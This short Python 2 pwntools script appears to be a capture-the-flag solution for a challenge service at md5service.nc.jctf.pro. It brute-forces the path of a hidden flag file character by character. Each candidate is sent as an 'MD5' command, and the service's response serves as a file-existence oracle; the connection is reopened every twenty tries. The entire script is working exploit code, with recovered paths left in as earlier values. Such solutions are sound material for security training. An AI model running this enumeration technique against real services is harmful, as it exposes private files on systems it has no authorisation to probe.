from pwn import *

r = remote('md5service.nc.jctf.pro', 1337)

alpha = "1234567890"
alpha += "abcdefghijklmnopqrstuvwxyz._-"
alpha += alpha.upper()
r.read()
count = 0


known = "md5service.sh"
known = "md5service.py"
known = "4417905b7d091f00ff59b51d5d78.txt"
known = "/flag_a6214417905b7d091f00ff59b51d5d78.txt"
known = "/0c8702194e16f006e61f45d5fa0cd511/flag_a6214417905b7d091f00ff59b51d5d78.txt"
lastknown = ""
while True:
    lastknown = known
    print 'known: ', known
    for i in alpha:
        if count % 20 == 0:
            r.close()
            r = remote('md5service.nc.jctf.pro', 1337)
        r.sendlineafter('Cmd: ', 'MD5 ' + i + known)
        r.readuntil('Result')
        r.readline()
        if r.readline().strip() != "b'\\n'":
            known = i + known
            break
        count += 1
    if lastknown == known:
        print "got all we're going to get", known
        break
